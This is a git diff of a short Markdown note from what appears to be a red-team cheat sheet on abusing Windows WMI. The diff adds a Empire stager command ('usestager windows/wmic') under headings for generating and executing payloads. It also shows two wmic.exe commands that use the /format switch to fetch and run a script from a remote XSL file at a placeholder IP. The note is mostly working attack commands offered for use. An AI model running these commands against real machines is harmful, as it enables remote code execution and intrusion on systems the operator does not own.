@@ -1,5 +1,17 @@
 # WMI
 
+## 01 - Generate Payloads
+
+### 1.1 - Empire
+
+TODO: Fill this info
+
+```
+(Empire) > usestager windows/wmic
+```
+
+### 1.2 - WMI Template
+
 ```xml
 <?xml version='1.0'?>
 <stylesheet
@@ -14,12 +26,14 @@ version="1.0">
 </stylesheet>
 ```
 
+## 02 - Execute Payloads
+
 Execute a script contained in the target `.xsl` file hosted on a remote server.
 
 ```
-C:\> wmic.exe os get /format:"http[s]://<IP>[:PORT]/implant.xsl"
+C:\> wmic.exe os get /format:"http[s]://<IP>[:PORT]/payload.xsl"
 
-C:\> wmic.exe process get brief /format:"http[s]://<IP>[:PORT]/implant.xsl"
+C:\> wmic.exe process get brief /format:"http[s]://<IP>[:PORT]/payload.xsl"
 ```
 
 ---
